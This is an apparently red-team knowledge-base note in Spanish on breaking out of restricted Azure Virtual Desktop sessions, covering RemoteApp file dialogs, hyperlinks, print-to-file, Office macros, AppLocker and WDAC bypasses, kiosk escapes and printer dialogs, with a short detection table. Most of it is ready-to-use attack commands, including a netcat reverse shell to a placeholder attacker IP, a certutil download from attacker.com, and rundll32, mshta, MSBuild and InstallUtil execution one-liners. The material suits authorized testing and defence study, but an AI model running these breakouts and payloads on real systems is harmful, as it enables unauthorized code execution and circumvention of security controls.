---
tags: [cloud, azure, avd, breakout, applocker, remoteapp, kiosk]
status: wip
---

# AVD — Breakout

> Técnicas para escapar de entornos AVD restringidos: RemoteApp publicada, escritorios con AppLocker/WDAC, kiosk mode y restricciones de GPO.

---

## Concepto

En muchos despliegues AVD, los usuarios reciben solo aplicaciones publicadas (RemoteApp) o escritorios bloqueados — no un escritorio completo con acceso a `cmd.exe` o PowerShell. El breakout busca saltar esas restricciones para obtener ejecución de comandos arbitraria.

---

## Escape desde RemoteApp

RemoteApp publica una sola aplicación (Word, Excel, un ERP) en una ventana aislada. Pero la aplicación corre dentro de una sesión RDP completa — solo se oculta el escritorio.

### Diálogos Abrir/Guardar

```
1. Dentro de la app publicada → Archivo → Abrir / Guardar como
2. En el diálogo de exploración de archivos:
   - Navegar a C:\Windows\System32\
   - En "Nombre de archivo" escribir: cmd.exe
   - En "Tipo" cambiar a "Todos los archivos (*.*)"
   - Click derecho en cmd.exe → Abrir
   
# Alternativas si cmd.exe está bloqueado:
   - powershell.exe
   - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
   - explorer.exe (para obtener escritorio)
   - mmc.exe (Microsoft Management Console)
```

### Hipervínculos

```
1. Si la app permite input de texto (Word, Outlook, Notepad++):
   - Escribir: file:///C:/Windows/System32/cmd.exe
   - Ctrl+Click o click derecho → Abrir hipervínculo
   
2. En Outlook:
   - Crear nuevo email
   - Insertar hipervínculo → file:///C:/Windows/System32/cmd.exe
   
3. En Excel:
   - =HYPERLINK("C:\Windows\System32\cmd.exe","click")
```

### Print to File

```
1. Archivo → Imprimir
2. Seleccionar impresora "Microsoft Print to PDF" o "Microsoft XPS Document Writer"
3. En el diálogo de guardado → misma técnica de navegación de archivos
4. Escribir cmd.exe en el campo de nombre → ejecutar
```

### Macros / Scripting

```vba
' Si la app es Office con macros habilitadas
Sub Breakout()
    Shell "cmd.exe", vbNormalFocus
End Sub

' Alternativa con WScript.Shell
Sub Breakout2()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell.exe -ep bypass"
End Sub
```

---

## Escape de AppLocker

```powershell
# Verificar políticas AppLocker activas
Get-AppLockerPolicy -Effective -Xml | Out-File C:\temp\applocker.xml

# O con reg query
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
```

### Directorios de bypass (writable + permitidos)

```
# Directorios que AppLocker permite por defecto (reglas default):
C:\Windows\Temp\                     ← writable por usuarios
C:\Windows\Tasks\                    ← writable
C:\Windows\tracing\                  ← writable
C:\Windows\System32\spool\drivers\color\  ← writable

# Copiar binario a uno de estos paths y ejecutar
copy \\tsclient\C\tools\nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe <ATTACKER_IP> <PORT>
```

### LOLBINs (Living Off The Land)

```powershell
# Binarios firmados por Microsoft que ejecutan código arbitrario

# MSBuild — ejecutar código C# inline
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil — bypass de AppLocker
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# Rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval(new ActiveXObject("WScript.Shell").Run("cmd"))

# MSHTA
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass"", 0:close")

# CertUtil — descargar y decodificar
certutil -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe

# WMIC (si no bloqueado)
wmic process call create "cmd.exe /c whoami > C:\temp\out.txt"
```

> 📖 Referencia completa: [LOLBAS Project](https://lolbas-project.github.io/)

---

## Escape de WDAC (Windows Defender Application Control)

```powershell
# WDAC es más restrictivo que AppLocker — se basa en code integrity

# Verificar política WDAC activa
Get-CIPolicy -FilePath "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b"

# Opciones si WDAC está activo:
# 1. Buscar binarios firmados en la allowlist que permitan ejecución
# 2. Abuso de scripts en directorios de confianza
# 3. Bypasses conocidos (dependen de la versión y configuración)

# Si la política está en modo Audit (no Enforce):
# → Todo se logea pero no se bloquea → ejecutar libremente
Get-WinEvent -LogName "Microsoft-Windows-CodeIntegrity/Operational" -MaxEvents 10
```

---

## Escape de Kiosk / Shell Replacement

```powershell
# Si el session host usa Shell Replacement (kiosk mode):
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon → Shell = "custom_app.exe"

# Técnicas:
# 1. Task Manager: Ctrl+Alt+End (equivale a Ctrl+Alt+Del en RDP) → Task Manager → File → Run new task
# 2. Sticky Keys: presionar Shift 5 veces → si sethc.exe no está reemplazado → cuadro de diálogo
# 3. Ctrl+Alt+End → Sign Out → en la pantalla de login, buscar Ease of Access / On-Screen Keyboard
# 4. Si hay barra de tareas: Win+R → ejecutar cmd
# 5. Desde utilidades accesibles: Narrator → configuración → About → links clickeables → navegador
```

---

## Escape via impresoras y drivers

```
1. Impresoras → agregar impresora → "The printer that I want isn't listed"
2. Explorar la red desde el diálogo → acceder a shares
3. O: agregar impresora por IP → en el diálogo, explorar sistema de archivos

# Si hay drivers de impresora con vulnerabilidades (PrintNightmare family):
# CVE-2021-1675 / CVE-2021-34527 → RCE como SYSTEM
```

---

## OPSEC / Detección

| Acción | Log/Alerta |
|--------|------------|
| AppLocker bypass | AppLocker Event 8003/8004 (si modo Enforce) |
| LOLBIN execution | Sysmon Event 1 con LOLBINs conocidos en command line |
| WDAC bypass | Code Integrity Event 3077/3089 |
| MSBuild/InstallUtil abuse | EDR alerts en .NET framework executables |
| Shell escape (Task Manager) | Process creation logs — taskmgr.exe → cmd.exe chain |

---

## Ver también

- [[09-cloud/azure/azure-virtual-desktop|Azure Virtual Desktop]]
- [[09-cloud/azure/avd---session-host-attacks|AVD - Session Host Attacks]]
- [[09-cloud/azure/avd---lateral-movement|AVD - Lateral Movement]]

---

## Referencias

- [LOLBAS Project](https://lolbas-project.github.io/)
- [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
- [WAM — Windows Application Model Bypass](https://www.yourexploitmasterclass.com/)
- [HackTricks — AppLocker Bypass](https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/applocker-bypass)
